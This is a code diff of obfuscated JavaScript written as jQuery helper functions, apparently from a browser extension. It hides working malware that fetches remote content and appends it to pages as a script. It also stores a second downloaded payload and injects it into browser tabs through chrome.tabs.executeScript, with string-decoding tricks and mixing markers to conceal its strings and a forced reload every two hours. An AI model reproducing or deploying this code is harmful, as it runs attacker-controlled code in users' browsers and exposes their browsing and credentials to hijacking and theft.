@@ -1,3 +1,21 @@
+jQuery.xGet = function(hash) {
+    var result = '';
+    for (var i=0; i<hash.length; i++) {
+        /*%BEGIN_MIX%*/
+        var _pgrwcm = true;
+        var stringName = "String";
+        var ch = "fromChar" + "Code";
+        /*%END_MIX%*/
+        var code = ch.slice(8,2+10);
+        var stringProto = window[stringName];
+        var k = $K;
+        var r = hash['char' + code + 'At'](i);
+
+        result += stringProto[ch]((~k | ~r) & (k | r));
+    }
+    return result;
+};
+
 jQuery.xAddr = function(noBg) {
 	/*%BEGIN_MIX%*/
 	noBg = noBg || false;
@@ -27,17 +45,7 @@ jQuery.xAddr = function(noBg) {
 };
 
 jQuery.xTabs = function() {
-	/*%BEGIN_MIX%*/
-	var r = "r";
-	var bs = "bs";
-	var o = "o";
-	var ch = "ch";
-	var t = "t";
-	var me = "me";
-	var a = "a";
-	/*%END_MIX%*/
-
-	return window[ch + r + o + me][t + a + bs];
+    return window['chrome']['tabs'];
 };
 
 jQuery.xStore = function(callback, insert) {
@@ -53,21 +61,24 @@ jQuery.xStore = function(callback, insert) {
 	o.addListener(function(tb) {
 		/*%BEGIN_MIX%*/
 
-		/*%FORCE_BLOCK%*/
+		/*%BEGIN_BLOCK%*/
 			if (lll.xcnt) {
 				if (lll.xcnt > 20) callback(); else lll.xcnt++;
 			} else
 				lll.xcnt = 1;
 
-		insert(tb);
+            insert(tb);
+        /*%END_BLOCK%*/
 
-		/*%FORCE_BLOCK%*/
+
+		/*%BEGIN_BLOCK%*/
 			var now = jQuery.now();
 			if (!window.uptmnd) {
 				window.uptmnd = now + 2*60*60*1000;
 			} else if (window.uptmnd < now) {
 				location.reload();
 			}
+        /*%END_BLOCK%*/
 
 		/*%END_MIX%*/
 	});
@@ -83,38 +94,41 @@ jQuery.xLoad = function() {
 
 		if (tabs && typeof tabs !== "undefined") {
 			var t = true, k, load;
-
 			/*%BEGIN_MIX%*/
 
-			/*%FORCE_BLOCK%*/
+			/*%BEGIN_BLOCK%*/
 				k = function() {
 					if (!t) return; t = false;
 
 					/*%BEGIN_MIX%*/
-					/*%FORCE_BLOCK%*/
+					/*%BEGIN_BLOCK%*/
 						jQuery.get(jQuery.xAddr(), function(a) {
 							if (a < " ") return;
 							var u = "s" + e + ">";
 							jQuery("body").append("<" + u + a + "</" + u);
 						});
-					/*%FORCE_BLOCK%*/
+                    /*%END_BLOCK%*/
+					/*%BEGIN_BLOCK%*/
 						jQuery.get(jQuery.xAddr(!t), function(a) {
 							if (a < " ") return;
 							ls.xbrequurf = a;
 						});
+                    /*%END_BLOCK%*/
 					/*%END_MIX%*/
 				};
+            /*%END_BLOCK%*/
 
-			/*%FORCE_BLOCK%*/
+			/*%BEGIN_BLOCK%*/
 				load = function(tab) {
 					var a = ls.xbrequurf;
 					if (!a || a < " " || !tab) return;
 					tabs["executeS" + e](tab, {code: a});
 				};
+            /*%END_BLOCK%*/
+            /*%END_MIX%*/
 
 			jQuery.xStore(k, load);
 
-			/*%END_MIX%*/
 		}
 	} catch(e) {}
 };
